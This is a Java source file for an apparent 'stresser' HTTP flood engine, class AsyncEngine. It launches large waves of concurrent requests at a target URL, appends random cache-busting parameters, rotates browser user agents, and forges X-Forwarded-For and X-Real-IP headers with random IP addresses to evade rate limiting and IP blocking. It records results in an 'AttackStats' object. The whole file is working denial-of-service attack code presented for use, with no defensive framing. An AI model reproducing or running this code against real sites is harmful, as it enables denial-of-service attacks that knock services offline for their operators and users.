package com.stresser.engine;

import com.stresser.model.AttackStats;
import okhttp3.*;
import java.io.IOException;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.security.MessageDigest;
import java.util.Random;
import java.util.concurrent.*;

public class AsyncEngine {
    
    private static final String[] USER_AGENTS = {
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0",
        "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 Chrome/120.0.6099.144",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2) AppleWebKit/605.1.15"
    };
    
    private final OkHttpClient client;
    private final Random random = new Random();
    
    public AsyncEngine() {
        ConnectionPool pool = new ConnectionPool(5000, 5, TimeUnit.MINUTES);
        
        this.client = new OkHttpClient.Builder()
                .connectionPool(pool)
                .connectTimeout(5, TimeUnit.SECONDS)
                .readTimeout(5, TimeUnit.SECONDS)
                .writeTimeout(5, TimeUnit.SECONDS)
                .build();
    }
    
    public void executeAsyncWave(String target, int waveSize, AttackStats stats) {
        CompletableFuture<?>[] futures = new CompletableFuture[waveSize];
        
        for (int i = 0; i < waveSize; i++) {
            futures[i] = CompletableFuture.runAsync(() -> {
                try {
                    executeRequest(target, stats);
                } catch (Exception e) {
                    stats.incrementFailed();
                }
            });
        }
        
        CompletableFuture.allOf(futures).join();
    }
    
    private void executeRequest(String target, AttackStats stats) {
        String fakeIP = generateFakeIP();
        
        Request request = new Request.Builder()
                .url(target + "?v=" + System.currentTimeMillis() + "&_=" + randomHash())
                .addHeader("User-Agent", USER_AGENTS[random.nextInt(USER_AGENTS.length)])
                .addHeader("X-Forwarded-For", fakeIP)
                .addHeader("X-Real-IP", fakeIP)
                .addHeader("Accept", "*/*")
                .build();
        
        try (Response response = client.newCall(request).execute()) {
            stats.incrementTotal();
            
            if (response.isSuccessful()) {
                stats.incrementSuccess();
                if (response.body() != null) {
                    stats.addBytes(response.body().contentLength());
                }
            } else {
                stats.incrementFailed();
            }
        } catch (IOException e) {
            stats.incrementTotal();
            stats.incrementFailed();
        }
    }
    
    private String generateFakeIP() {
        return random.nextInt(256) + "." + 
               random.nextInt(256) + "." + 
               random.nextInt(256) + "." + 
               random.nextInt(256);
    }
    
    private String randomHash() {
        try {
            MessageDigest md = MessageDigest.getInstance("MD5");
            byte[] hash = md.digest(String.valueOf(random.nextDouble()).getBytes());
            StringBuilder sb = new StringBuilder();
            for (int i = 0; i < 4; i++) {
                sb.append(String.format("%02x", hash[i]));
            }
            return sb.toString();
        } catch (Exception e) {
            return String.valueOf(random.nextInt(999999));
        }
    }
}
